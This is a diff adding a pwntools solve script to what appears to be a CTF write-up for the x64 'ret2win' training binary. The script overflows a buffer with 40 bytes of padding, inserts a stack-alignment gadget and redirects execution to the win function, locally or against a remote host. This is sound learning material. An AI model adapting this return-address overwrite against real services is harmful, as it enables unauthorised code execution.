@@ -307,6 +307,56 @@ ROPE{a_placeholder_32byte_flag!}
 [*] Got EOF while sending in interactive
 ```
 
+Here's the solve script for the x64 binary
+
+```
+from pwn import *
+
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Binary filename
+exe = './ret2win'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'debug'
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+
+# Pass in pattern_size, get back EIP/RIP offset
+offset = 40
+
+# Start program
+io = start()
+
+padding = "A" * offset 
+movaps = 0x000000000040053e  #I had to debug cause there was movap stack allignment
+# Build the payload
+payload = flat([
+    padding,
+    movaps,
+    elf.functions['ret2win']
+])
+
+#write('payload', payload)
+# Send the payload
+io.sendlineafter(b'>', payload)
+
+# Got Shell?
+io.interactive()
+```
 And we're done
 
 <br> <br> 
